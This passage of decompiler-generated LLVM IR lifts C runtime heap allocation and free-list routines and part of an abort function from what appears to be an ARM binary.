  uselistorder i32* bitcast (i32** @global_var_23f3c.731 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_12998, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_12950, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_128c4, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_129b0 = inttoptr i32 %arg2 to i32*
  %v2_129b0 = load i32, i32* %v1_129b0, align 4
  %v3_129b4 = load i32, i32* @r4, align 4
  store i32 %v3_129b4, i32* %stack_var_-8, align 4
  %v1_129b8 = add i32 %v2_129b0, 3
  %v1_129bc = and i32 %v1_129b8, -4
  store i32 %v1_129bc, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_129c4 = icmp ugt i32 %v1_129bc, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_129cc = load i32, i32* %arg1, align 4
  store i32 %v2_129cc, i32* %r0.global-to-local, align 4
  br i1 %v2_129c4, label %dec_label_pc_12a38.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12a38.preheader

dec_label_pc_12a38.preheader:                     ; preds = %entry, %bb
  %v1_129ec = phi i32 [ %v1_129bc, %entry ], [ 12, %bb ]
  %v2_12a389 = icmp eq i32 %v2_129cc, 0
  br i1 %v2_12a389, label %dec_label_pc_12a40, label %dec_label_pc_129d8

dec_label_pc_129d8:                               ; preds = %dec_label_pc_12a38.preheader, %dec_label_pc_12a34
  %v2_129f0 = phi i32 [ %v3_12a34, %dec_label_pc_12a34 ], [ %v2_129cc, %dec_label_pc_12a38.preheader ]
  %v1_129d8 = inttoptr i32 %v2_129f0 to i32*
  %v2_129d8 = load i32, i32* %v1_129d8, align 4
  store i32 %v2_129d8, i32* @ip, align 4
  %v3_129dc = icmp ult i32 %v2_129d8, %v1_129ec
  br i1 %v3_129dc, label %dec_label_pc_12a34, label %dec_label_pc_129e4

dec_label_pc_129e4:                               ; preds = %dec_label_pc_129d8
  %v1_129e4 = add i32 %v1_129ec, 44
  %v3_129e8 = icmp ult i32 %v2_129d8, %v1_129e4
  br i1 %v3_129e8, label %dec_label_pc_129f8, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_129e4
  %v2_129dc.le = sub i32 %v2_129d8, %v1_129ec
  store i32 %v2_129dc.le, i32* %v1_129d8, align 4
  %v0_12a24.pre = load i32, i32* @ip, align 4
  %v0_12a2c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_129f8:                               ; preds = %dec_label_pc_129e4
  %v1_129f8 = add i32 %v2_129f0, 4
  %v2_129f8 = inttoptr i32 %v1_129f8 to i32*
  %v3_129f8 = load i32, i32* %v2_129f8, align 4
  store i32 %v3_129f8, i32* %r2.global-to-local, align 4
  %v2_129fc = icmp eq i32 %v3_129f8, 0
  br i1 %v2_129fc, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_129f8
  %v2_12a00 = add i32 %v2_129f0, 8
  %v3_12a00 = inttoptr i32 %v2_12a00 to i32*
  %v4_12a00 = load i32, i32* %v3_12a00, align 4
  %v3_12a04 = add i32 %v3_129f8, 8
  %v4_12a04 = inttoptr i32 %v3_12a04 to i32*
  store i32 %v4_12a00, i32* %v4_12a04, align 4
  %v0_12a08.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_129f8, %bb27
  %v0_12a08 = phi i32 [ %v2_129f0, %dec_label_pc_129f8 ], [ %v0_12a08.pre, %bb27 ]
  %v1_12a08 = add i32 %v0_12a08, 8
  %v2_12a08 = inttoptr i32 %v1_12a08 to i32*
  %v3_12a08 = load i32, i32* %v2_12a08, align 4
  %v1_12a0c = add i32 %v0_12a08, 4
  %v2_12a0c = inttoptr i32 %v1_12a0c to i32*
  %v3_12a0c = load i32, i32* %v2_12a0c, align 4
  %v2_12a10 = icmp eq i32 %v3_12a08, 0
  br i1 %v2_12a10, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_12a14 = add i32 %v3_12a08, 4
  %v4_12a14 = inttoptr i32 %v3_12a14 to i32*
  store i32 %v3_12a0c, i32* %v4_12a14, align 4
  %v1_12a1c = load i32, i32* @ip, align 4
  store i32 %v1_12a1c, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_12a18 = load i32, i32* %r1.global-to-local, align 4
  %v3_12a18 = inttoptr i32 %v2_12a18 to i32*
  store i32 %v3_12a0c, i32* %v3_12a18, align 4
  %v1_12a20.pre = load i32, i32* @ip, align 4
  store i32 %v1_12a20.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_12a2c = phi i32 [ %v0_12a2c.pre, %.thread._crit_edge ], [ %v1_12a1c, %bb28 ], [ %v1_12a20.pre, %.thread5 ]
  %v0_12a24 = phi i32 [ %v0_12a24.pre, %.thread._crit_edge ], [ %v1_12a1c, %bb28 ], [ %v1_12a20.pre, %.thread5 ]
  %v1_12a24 = load i32, i32* %r0.global-to-local, align 4
  %v2_12a24 = sub i32 %v1_12a24, %v0_12a24
  %v1_12a28 = add i32 %v2_12a24, 12
  store i32 %v1_12a28, i32* %r0.global-to-local, align 4
  %v1_12a2c = load i32, i32* %r4.global-to-local, align 4
  %v2_12a2c = inttoptr i32 %v1_12a2c to i32*
  store i32 %v0_12a2c, i32* %v2_12a2c, align 4
  %v2_12a30 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12a30, i32* %r4.global-to-local, align 4
  ret i32 %v1_12a28

dec_label_pc_12a34:                               ; preds = %dec_label_pc_129d8
  %v1_12a34 = add i32 %v2_129f0, 4
  %v2_12a34 = inttoptr i32 %v1_12a34 to i32*
  %v3_12a34 = load i32, i32* %v2_12a34, align 4
  store i32 %v3_12a34, i32* %r0.global-to-local, align 4
  %v2_12a38 = icmp eq i32 %v3_12a34, 0
  br i1 %v2_12a38, label %dec_label_pc_12a38.dec_label_pc_12a40_crit_edge, label %dec_label_pc_129d8

dec_label_pc_12a38.dec_label_pc_12a40_crit_edge:  ; preds = %dec_label_pc_12a34
  br label %dec_label_pc_12a40

dec_label_pc_12a40:                               ; preds = %dec_label_pc_12a38.dec_label_pc_12a40_crit_edge, %dec_label_pc_12a38.preheader
  store i32 %v3_129b4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_12a34, { 1, 2, 0 }
  uselistorder i32 %v0_12a08, { 1, 0 }
  uselistorder i32 %v2_129d8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_129f0, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_129ec, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_129d8, { 1, 0 }
  uselistorder label %dec_label_pc_12a38.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_12a48 = load i32, i32* %arg1, align 4
  store i32 %v2_12a48, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_12ac06 = icmp eq i32 %v2_12a48, 0
  br i1 %v2_12ac06, label %dec_label_pc_12ac8, label %dec_label_pc_12a54

dec_label_pc_12a54:                               ; preds = %entry, %dec_label_pc_12abc
  %v0_12a94 = phi i32 [ %v3_12abc, %dec_label_pc_12abc ], [ %v2_12a48, %entry ]
  %v1_12a54 = inttoptr i32 %v0_12a94 to i32*
  %v2_12a54 = load i32, i32* %v1_12a54, align 4
  store i32 %v2_12a54, i32* %r0.global-to-local, align 4
  %v2_12a58 = sub i32 %v0_12a94, %v2_12a54
  %v1_12a5c = add i32 %v2_12a58, 12
  %v3_12a60 = icmp uge i32 %v1_12a5c, %arg2
  %v9_12a60 = icmp eq i32 %v1_12a5c, %arg2
  %v2_12a64 = xor i1 %v9_12a60, true
  %v3_12a64 = and i1 %v3_12a60, %v2_12a64
  br i1 %v3_12a64, label %dec_label_pc_12abc, label %dec_label_pc_12a68

dec_label_pc_12a68:                               ; preds = %dec_label_pc_12a54
  br i1 %v9_12a60, label %dec_label_pc_12a6c, label %dec_label_pc_12ac8

dec_label_pc_12a6c:                               ; preds = %dec_label_pc_12a68
  %v1_12a6c = add i32 %arg3, 3
  %v1_12a70 = and i32 %v1_12a6c, -4
  store i32 %v1_12a70, i32* %r2.global-to-local, align 4
  %v2_12a74 = sub i32 %v2_12a54, %v1_12a70
  %v3_12a74 = icmp ult i32 %v2_12a54, %v1_12a70
  br i1 %v3_12a74, label %dec_label_pc_12ac8, label %dec_label_pc_12a7c

dec_label_pc_12a7c:                               ; preds = %dec_label_pc_12a6c
  %v1_12a7c = add i32 %v1_12a70, 44
  %v3_12a80 = icmp ult i32 %v2_12a54, %v1_12a7c
  br i1 %v3_12a80, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_12a7c
  store i32 %v2_12a74, i32* %v1_12a54, align 4
  %v1_12a8c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_12a8c, i32* %r0.global-to-local, align 4
  ret i32 %v1_12a8c

.thread2:                                         ; preds = %dec_label_pc_12a7c
  %v1_12a94 = add i32 %v0_12a94, 4
  %v2_12a94 = inttoptr i32 %v1_12a94 to i32*
  %v3_12a94 = load i32, i32* %v2_12a94, align 4
  store i32 %v3_12a94, i32* %r2.global-to-local, align 4
  %v2_12a98 = icmp eq i32 %v3_12a94, 0
  br i1 %v2_12a98, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_12a9c = add i32 %v0_12a94, 8
  %v3_12a9c = inttoptr i32 %v2_12a9c to i32*
  %v4_12a9c = load i32, i32* %v3_12a9c, align 4
  %v3_12aa0 = add i32 %v3_12a94, 8
  %v4_12aa0 = inttoptr i32 %v3_12aa0 to i32*
  store i32 %v4_12a9c, i32* %v4_12aa0, align 4
  %v0_12aa4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_12aa4 = phi i32 [ %v0_12a94, %.thread2 ], [ %v0_12aa4.pre, %bb17 ]
  %v1_12aa4 = add i32 %v0_12aa4, 8
  %v2_12aa4 = inttoptr i32 %v1_12aa4 to i32*
  %v3_12aa4 = load i32, i32* %v2_12aa4, align 4
  store i32 %v3_12aa4, i32* %r2.global-to-local, align 4
  %v1_12aa8 = add i32 %v0_12aa4, 4
  %v2_12aa8 = inttoptr i32 %v1_12aa8 to i32*
  %v3_12aa8 = load i32, i32* %v2_12aa8, align 4
  %v2_12aac = icmp eq i32 %v3_12aa4, 0
  br i1 %v2_12aac, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_12ab0 = add i32 %v3_12aa4, 4
  %v4_12ab0 = inttoptr i32 %v3_12ab0 to i32*
  store i32 %v3_12aa8, i32* %v4_12ab0, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_12ab4 = load i32, i32* %lr.global-to-local, align 4
  %v3_12ab4 = inttoptr i32 %v2_12ab4 to i32*
  store i32 %v3_12aa8, i32* %v3_12ab4, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_12ab8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_12ab8

dec_label_pc_12abc:                               ; preds = %dec_label_pc_12a54
  %v1_12abc = add i32 %v0_12a94, 4
  %v2_12abc = inttoptr i32 %v1_12abc to i32*
  %v3_12abc = load i32, i32* %v2_12abc, align 4
  store i32 %v3_12abc, i32* %ip.global-to-local, align 4
  %v2_12ac0 = icmp eq i32 %v3_12abc, 0
  br i1 %v2_12ac0, label %dec_label_pc_12ac0.dec_label_pc_12ac8.loopexit_crit_edge, label %dec_label_pc_12a54

dec_label_pc_12ac0.dec_label_pc_12ac8.loopexit_crit_edge: ; preds = %dec_label_pc_12abc
  br label %dec_label_pc_12ac8

dec_label_pc_12ac8:                               ; preds = %dec_label_pc_12a6c, %entry, %dec_label_pc_12ac0.dec_label_pc_12ac8.loopexit_crit_edge, %dec_label_pc_12a68
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_12abc, { 1, 2, 0 }
  uselistorder i32 %v0_12aa4, { 1, 0 }
  uselistorder i32 %v1_12a70, { 0, 2, 1, 3 }
  uselistorder i1 %v9_12a60, { 1, 0 }
  uselistorder i32 %v2_12a54, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_12a94, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_12ac8, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12a54, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_12ad0 = load i32, i32* @r2, align 4
  %v2_12ad0 = icmp eq i32 %v0_12ad0, 0
  %v0_12ad4 = load i32, i32* @r3, align 4
  %v1_12ad4 = load i32, i32* @r1, align 4
  %v2_12ad4 = add i32 %v1_12ad4, 4
  %v3_12ad4 = inttoptr i32 %v2_12ad4 to i32*
  store i32 %v0_12ad4, i32* %v3_12ad4, align 4
  %v0_12ad8 = load i32, i32* @r2, align 4
  %v1_12ad8 = load i32, i32* @r1, align 4
  %v2_12ad8 = add i32 %v1_12ad8, 8
  %v3_12ad8 = inttoptr i32 %v2_12ad8 to i32*
  store i32 %v0_12ad8, i32* %v3_12ad8, align 4
  %v1_12ae0 = load i32, i32* @r1, align 4
  br i1 %v2_12ad0, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_12adc = load i32, i32* @r2, align 4
  %v3_12adc = add i32 %v2_12adc, 4
  %v4_12adc = inttoptr i32 %v3_12adc to i32*
  store i32 %v1_12ae0, i32* %v4_12adc, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_12ae0 = load i32, i32* @r0, align 4
  %v3_12ae0 = inttoptr i32 %v2_12ae0 to i32*
  store i32 %v1_12ae0, i32* %v3_12ae0, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_12ae4 = load i32, i32* @r3, align 4
  %v2_12ae4 = icmp eq i32 %v0_12ae4, 0
  br i1 %v2_12ae4, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_12ae8 = load i32, i32* @r1, align 4
  %v3_12ae8 = add i32 %v0_12ae4, 8
  %v4_12ae8 = inttoptr i32 %v3_12ae8 to i32*
  store i32 %v1_12ae8, i32* %v4_12ae8, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_12aec = load i32, i32* @r0, align 4
  ret i32 %v1_12aec

; uselistorder directives
  uselistorder i32 %v1_12ae0, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_12af0 = load i32, i32* @r2, align 4
  %v2_12af0 = icmp eq i32 %v0_12af0, 0
  %v1_12af4 = load i32, i32* @r1, align 4
  br i1 %v2_12af0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_12af4 = load i32, i32* @r0, align 4
  %v3_12af4 = inttoptr i32 %v2_12af4 to i32*
  store i32 %v1_12af4, i32* %v3_12af4, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_12af8 = add i32 %v0_12af0, 4
  %v4_12af8 = inttoptr i32 %v3_12af8 to i32*
  store i32 %v1_12af4, i32* %v4_12af8, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_12afc = load i32, i32* @r2, align 4
  %v1_12afc = load i32, i32* @r1, align 4
  %v2_12afc = add i32 %v1_12afc, 8
  %v3_12afc = inttoptr i32 %v2_12afc to i32*
  store i32 %v0_12afc, i32* %v3_12afc, align 4
  %v1_12b00 = load i32, i32* @r0, align 4
  ret i32 %v1_12b00

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12b04 = load i32, i32* @r4, align 4
  store i32 %v3_12b04, i32* %stack_var_-20, align 4
  %v2_12b08 = load i32, i32* %arg1, align 4
  store i32 %v2_12b08, i32* %r4.global-to-local, align 4
  %v2_12b0c = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_12b282 = icmp eq i32 %v2_12b08, 0
  br i1 %v2_12b282, label %dec_label_pc_12bd8, label %dec_label_pc_12b18

dec_label_pc_12b18:                               ; preds = %entry, %dec_label_pc_12b20
  %v0_12b68 = phi i32 [ %v0_12b70, %dec_label_pc_12b20 ], [ 0, %entry ]
  %v0_12b70 = phi i32 [ %v3_12b24, %dec_label_pc_12b20 ], [ %v2_12b08, %entry ]
  %v1_12b2c5.in = phi i32 [ %v3_12b24, %dec_label_pc_12b20 ], [ %v2_12b08, %entry ]
  %v1_12b2c5 = add i32 %v1_12b2c5.in, 12
  %v3_12b18 = icmp ult i32 %v1_12b2c5, %arg2
  br i1 %v3_12b18, label %dec_label_pc_12b20, label %dec_label_pc_12b38

dec_label_pc_12b20:                               ; preds = %dec_label_pc_12b18
  store i32 %v0_12b70, i32* %r6.global-to-local, align 4
  %v1_12b24 = add i32 %v0_12b70, 4
  %v2_12b24 = inttoptr i32 %v1_12b24 to i32*
  %v3_12b24 = load i32, i32* %v2_12b24, align 4
  store i32 %v3_12b24, i32* %r4.global-to-local, align 4
  %v2_12b28 = icmp eq i32 %v3_12b24, 0
  br i1 %v2_12b28, label %dec_label_pc_12b28.dec_label_pc_12bd8.loopexit_crit_edge, label %dec_label_pc_12b18

dec_label_pc_12b38:                               ; preds = %dec_label_pc_12b18
  %v1_12b38 = inttoptr i32 %v0_12b70 to i32*
  %v2_12b38 = load i32, i32* %v1_12b38, align 4
  store i32 %v2_12b38, i32* @ip, align 4
  %v2_12b3c = sub i32 %v0_12b70, %v2_12b38
  %v1_12b40 = add i32 %v2_12b3c, 12
  %v3_12b44 = icmp uge i32 %v1_12b40, %v2_12b0c
  %v9_12b44 = icmp eq i32 %v1_12b40, %v2_12b0c
  %v2_12b48 = xor i1 %v9_12b44, true
  %v3_12b48 = and i1 %v3_12b44, %v2_12b48
  br i1 %v3_12b48, label %dec_label_pc_12bd8, label %dec_label_pc_12b4c

dec_label_pc_12b4c:                               ; preds = %dec_label_pc_12b38
  %v2_12b4c = add i32 %v2_12b38, %arg3
  store i32 %v2_12b4c, i32* %r7.global-to-local, align 4
  br i1 %v9_12b44, label %dec_label_pc_12b54, label %dec_label_pc_12b80

dec_label_pc_12b54:                               ; preds = %dec_label_pc_12b4c
  %v2_12b54 = icmp eq i32 %v0_12b68, 0
  br i1 %v2_12b54, label %dec_label_pc_12bcc, label %dec_label_pc_12b5c

dec_label_pc_12b5c:                               ; preds = %dec_label_pc_12b54
  %v1_12b5c = add i32 %v0_12b68, 12
  %v9_12b60 = icmp eq i32 %v1_12b5c, %arg2
  br i1 %v9_12b60, label %dec_label_pc_12b68, label %dec_label_pc_12bcc

dec_label_pc_12b68:                               ; preds = %dec_label_pc_12b5c
  %v1_12b68 = inttoptr i32 %v0_12b68 to i32*
  %v2_12b68 = load i32, i32* %v1_12b68, align 4
  %v1_12b6c = add i32 %v0_12b68, 8
  %v2_12b6c = inttoptr i32 %v1_12b6c to i32*
  %v3_12b6c = load i32, i32* %v2_12b6c, align 4
  store i32 %v3_12b6c, i32* @r2, align 4
  store i32 %v0_12b70, i32* @r1, align 4
  %v2_12b74 = add i32 %v2_12b68, %v2_12b4c
  store i32 %v2_12b74, i32* %r7.global-to-local, align 4
  %v0_12b78 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_12bcc

dec_label_pc_12b80:                               ; preds = %dec_label_pc_12b4c
  %v1_12b80 = add i32 %v0_12b70, 4
  %v2_12b80 = inttoptr i32 %v1_12b80 to i32*
  %v3_12b80 = load i32, i32* %v2_12b80, align 4
  store i32 %v3_12b80, i32* %r5.global-to-local, align 4
  %v2_12b84 = icmp eq i32 %v3_12b80, 0
  br i1 %v2_12b84, label %dec_label_pc_12bb8, label %dec_label_pc_12b8c

dec_label_pc_12b8c:                               ; preds = %dec_label_pc_12b80
  %v1_12b8c = inttoptr i32 %v3_12b80 to i32*
  %v2_12b8c = load i32, i32* %v1_12b8c, align 4
  store i32 %v2_12b8c, i32* @ip, align 4
  %v2_12b90 = sub i32 %v3_12b80, %v2_12b8c
  %v1_12b94 = add i32 %v2_12b90, 12
  %v9_12b98 = icmp eq i32 %v2_12b0c, %v1_12b94
  br i1 %v9_12b98, label %dec_label_pc_12ba0, label %dec_label_pc_12bb8

dec_label_pc_12ba0:                               ; preds = %dec_label_pc_12b8c
  store i32 %v0_12b68, i32* @r2, align 4
  store i32 %v3_12b80, i32* @r1, align 4
  %v2_12ba8 = add i32 %v2_12b8c, %v2_12b4c
  store i32 %v2_12ba8, i32* %r7.global-to-local, align 4
  %v0_12bac = call i32 @__heap_link_free_area_after()
  %v0_12bb0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12bb0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12bcc

dec_label_pc_12bb8:                               ; preds = %dec_label_pc_12b8c, %dec_label_pc_12b80
  %v2_12bb8 = add i32 %v0_12b70, %arg3
  store i32 %v2_12bb8, i32* %r4.global-to-local, align 4
  store i32 %v3_12b80, i32* @r3, align 4
  store i32 %v0_12b68, i32* @r2, align 4
  store i32 %v2_12bb8, i32* @r1, align 4
  %v0_12bc8 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_12bcc

dec_label_pc_12bcc:                               ; preds = %dec_label_pc_12b5c, %dec_label_pc_12b54, %dec_label_pc_12ba0, %dec_label_pc_12b68, %dec_label_pc_12bb8
  %v0_12bcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12bcc, i32* %r5.global-to-local, align 4
  %v0_12bd0 = load i32, i32* %r7.global-to-local, align 4
  %v2_12bd0 = inttoptr i32 %v0_12bcc to i32*
  store i32 %v0_12bd0, i32* %v2_12bd0, align 4
  br label %dec_label_pc_12bf0

dec_label_pc_12b28.dec_label_pc_12bd8.loopexit_crit_edge: ; preds = %dec_label_pc_12b20
  br label %dec_label_pc_12bd8

dec_label_pc_12bd8:                               ; preds = %entry, %dec_label_pc_12b28.dec_label_pc_12bd8.loopexit_crit_edge, %dec_label_pc_12b38
  %v1_12bd8 = add i32 %v2_12b0c, -12
  store i32 %v1_12bd8, i32* %r5.global-to-local, align 4
  %v3_12bdc = inttoptr i32 %v1_12bd8 to i32*
  store i32 %arg3, i32* %v3_12bdc, align 4
  %v0_12be0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12be0, i32* @r3, align 4
  %v0_12be4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12be4, i32* @r2, align 4
  %v0_12be8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12be8, i32* @r1, align 4
  %v0_12bec = call i32 @__heap_link_free_area()
  br label %dec_label_pc_12bf0

dec_label_pc_12bf0:                               ; preds = %dec_label_pc_12bcc, %dec_label_pc_12bd8
  %v0_12bf0 = load i32, i32* %r5.global-to-local, align 4
  %v2_12bf4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12bf4, i32* @r4, align 4
  ret i32 %v0_12bf0

; uselistorder directives
  uselistorder i32 %v3_12b80, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_12b44, { 1, 0 }
  uselistorder i32 %v3_12b24, { 2, 3, 1, 0 }
  uselistorder i32 %v0_12b70, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_12b68, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12bf0, { 1, 0 }
  uselistorder label %dec_label_pc_12bd8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12bcc, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_12b18, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_12c14.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_12bf8 = ptrtoint i32* %stack_var_-268 to i32
  %v1_12c08 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_12c14 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_12c14

dec_label_pc_12c14:                               ; preds = %dec_label_pc_12c14.lr.ph, %dec_label_pc_12c14
  %v1_12c18 = phi i32 [ 31, %dec_label_pc_12c14.lr.ph ], [ %v1_12c24, %dec_label_pc_12c14 ]
  %v4_12c18 = mul i32 %v1_12c18, 4
  %v5_12c18 = add i32 %v4_12c18, %v2_12c14
  %v2_12c20 = add i32 %v5_12c18, -128
  %v3_12c20 = inttoptr i32 %v2_12c20 to i32*
  store i32 0, i32* %v3_12c20, align 4
  %v0_12c24 = load i32, i32* %r1.global-to-local, align 4
  %v1_12c24 = add i32 %v0_12c24, -1
  store i32 %v1_12c24, i32* %r1.global-to-local, align 4
  %v6_12c24 = icmp slt i32 %v1_12c24, 0
  br i1 %v6_12c24, label %dec_label_pc_12c2c, label %dec_label_pc_12c14

dec_label_pc_12c2c:                               ; preds = %dec_label_pc_12c14
  %v2_12c2c = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_12c2c, i32* @r4, align 4
  store i32 %v2_12c2c, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_12c38 = call i32 @__sigaddset()
  %v2_12c3c = icmp eq i32 %v0_12c38, 0
  br i1 %v2_12c3c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12c2c
  store i32 %v2_12c2c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12c2c, %bb
  store i32 76880, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_12c3c, i32 ptrtoint (i32* @global_var_fa98.751 to i32))
  %v2_12c54 = load i32, i32* @global_var_2a3a8.753, align 4
  %v2_12c58 = icmp eq i32 %v2_12c54, 0
  br i1 %v2_12c58, label %dec_label_pc_12c60, label %dec_label_pc_12c90

dec_label_pc_12c60:                               ; preds = %.thread1
  store i32 1, i32* @global_var_2a3a8.753, align 4
  br label %dec_label_pc_12c68

dec_label_pc_12c68:                               ; preds = %dec_label_pc_12ce0, %dec_label_pc_12c60
  store i32 76920, i32* @lr, align 4
  %v1_12c74 = call i32 @__pthread_return_0()
  %v1_12c7c = call i32 @__raise(i32 6)
  store i32 76944, i32* @lr, align 4
  %v1_12c8c = call i32 @__pthread_return_0()
  %v2_12c94.pre = load i32, i32* @global_var_2a3a8.753, align 4
  br label %dec_label_pc_12c90

dec_label_pc_12c90:                               ; preds = %.thread1, %dec_label_pc_12c68
  %v0_12d04 = phi i32 [ %v2_12c54, %.thread1 ], [ %v2_12c94.pre, %dec_label_pc_12c68 ]
  store i32 ptrtoint (i32* @global_var_2a3a8.753 to i32), i32* %ip.global-to-local, align 4
  %v7_12c98 = icmp eq i32 %v0_12d04, 1
  br i1 %v7_12c98, label %dec_label_pc_12cc8.lr.ph, label %dec_label_pc_12cfc

dec_label_pc_12cc8.lr.ph:                         ; preds = %dec_label_pc_12c90
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_2a3a8.753, align 4
